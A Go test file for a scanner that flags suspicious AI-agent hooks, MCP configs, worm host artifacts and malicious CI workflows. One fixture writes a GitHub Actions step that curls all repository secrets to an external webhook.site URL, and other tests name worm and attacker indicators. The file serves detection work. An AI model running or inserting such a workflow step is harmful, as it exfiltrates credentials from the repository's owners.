package agentsurface_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/brynbellomy/veto/internal/scan"
	"github.com/brynbellomy/veto/internal/scan/agentsurface"
)

func TestScannerReportsSuspiciousSessionStartHook(t *testing.T) {
	home := t.TempDir()
	claudeDir := filepath.Join(home, ".claude")
	require.NoError(t, os.MkdirAll(claudeDir, 0o755))
	settings := `{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"npx -y mcp-mermaid"}]}]}}`
	require.NoError(t, os.WriteFile(filepath.Join(claudeDir, "settings.json"), []byte(settings), 0o644))

	result := agentsurface.New(agentsurface.Options{Home: home}).Scan(context.Background())

	require.Empty(t, result.Errors)
	require.Len(t, result.Findings, 2)
	require.Equal(t, scan.SurfaceAgentSurface, result.Findings[0].Surface)
	require.Equal(t, scan.SeverityMedium, result.Findings[0].Severity)
	require.NotContains(t, result.Findings[0].Evidence[1].Value, "secret")
}

func TestScannerRedactsSecretsInMCPConfig(t *testing.T) {
	home := t.TempDir()
	cursorDir := filepath.Join(home, ".cursor")
	require.NoError(t, os.MkdirAll(cursorDir, 0o755))
	config := `{"mcpServers":{"x":{"command":"npx","args":["-y","@modelcontextprotocol/server-x"],"env":{"API_KEY":"supersecret"}}}}`
	require.NoError(t, os.WriteFile(filepath.Join(cursorDir, "mcp.json"), []byte(config), 0o644))

	result := agentsurface.New(agentsurface.Options{Home: home}).Scan(context.Background())

	require.Empty(t, result.Errors)
	require.NotEmpty(t, result.Findings)
	require.Contains(t, result.Findings[0].Evidence[1].Value, "<redacted>")
	require.NotContains(t, result.Findings[0].Evidence[1].Value, "supersecret")
}

func TestScannerFlagsPackageManagerCommandAtLineStart(t *testing.T) {
	home := t.TempDir()
	claudeDir := filepath.Join(home, ".claude")
	require.NoError(t, os.MkdirAll(claudeDir, 0o755))
	settings := `{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"npm install left-pad"}]}]}}`
	require.NoError(t, os.WriteFile(filepath.Join(claudeDir, "settings.json"), []byte(settings), 0o644))

	result := agentsurface.New(agentsurface.Options{Home: home}).Scan(context.Background())

	require.Empty(t, result.Errors)
	require.NotEmpty(t, result.Findings)
	require.Equal(t, scan.SeverityMedium, result.Findings[0].Severity)
}

func TestScannerIncludesProjectSireneCommandLogs(t *testing.T) {
	root := t.TempDir()
	logDir := filepath.Join(root, ".sirene", "cli-tool-logs", "run")
	require.NoError(t, os.MkdirAll(logDir, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(logDir, "command.txt"), []byte("uvx suspicious-tool"), 0o644))

	result := agentsurface.New(agentsurface.Options{Home: t.TempDir(), ProjectRoots: []string{root}}).Scan(context.Background())

	require.Empty(t, result.Errors)
	require.NotEmpty(t, result.Findings)
	require.Equal(t, scan.SeverityLow, result.Findings[0].Severity)
	require.Contains(t, result.Findings[0].Title, "Sirene")
}

func TestScannerSurfacesHadesHostArtifacts(t *testing.T) {
	// We can't reliably create files at /tmp/.bun_ran during a test (CI
	// races, perms), so this test covers the home-dir probe shape which
	// the scanner accepts under an arbitrary `home` root.
	home := t.TempDir()
	bunCache := filepath.Join(home, ".cache", "bun")
	require.NoError(t, os.MkdirAll(bunCache, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(bunCache, "bun"), []byte("x"), 0o755))

	res := agentsurface.New(agentsurface.Options{Home: home}).Scan(context.Background())
	var titles []string
	for _, f := range res.Findings {
		titles = append(titles, f.Title)
	}
	require.True(t, containsString(titles, "Hades / Shai-Hulud .pth worm host artifact present"),
		"missing Hades host-artifact finding; got %v", titles)
}

func containsString(s []string, want string) bool {
	for _, x := range s {
		if x == want {
			return true
		}
	}
	return false
}

func TestScannerFindsHadesWorkflowExfil(t *testing.T) {
	root := t.TempDir()
	wf := filepath.Join(root, ".github", "workflows", "exfil.yml")
	require.NoError(t, os.MkdirAll(filepath.Dir(wf), 0o755))
	require.NoError(t, os.WriteFile(wf, []byte(`
on: push
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - run: curl -X POST https://webhook.site/abc -d "${{ toJson(secrets) }}"
`), 0o644))

	res := agentsurface.New(agentsurface.Options{ProjectRoots: []string{root}}).Scan(context.Background())
	var titles []string
	for _, f := range res.Findings {
		titles = append(titles, f.Title)
	}
	require.True(t, containsString(titles, "GitHub Actions workflow posts secrets to an external webhook (Hades exfil shape)"),
		"missing exfil finding; got %v", titles)
}

func TestScannerFindsHadesAttackerDirNaming(t *testing.T) {
	parent := t.TempDir()
	root := filepath.Join(parent, "stygian-cerberus-evil")
	require.NoError(t, os.MkdirAll(root, 0o755))
	res := agentsurface.New(agentsurface.Options{ProjectRoots: []string{root}}).Scan(context.Background())
	var titles []string
	for _, f := range res.Findings {
		titles = append(titles, f.Title)
	}
	require.True(t, containsString(titles, "Project directory name matches Hades / Shai-Hulud attacker naming"))
}

func TestScannerFlagsCustomizeInSitePackages(t *testing.T) {
	root := t.TempDir()
	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
	require.NoError(t, os.MkdirAll(site, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(site, "sitecustomize.py"), []byte("# anything"), 0o644))

	res := agentsurface.New(agentsurface.Options{ProjectRoots: []string{root}}).Scan(context.Background())
	var titles []string
	for _, f := range res.Findings {
		titles = append(titles, f.Title)
	}
	require.True(t, containsString(titles, "Python sitecustomize.py present inside site-packages"))
}
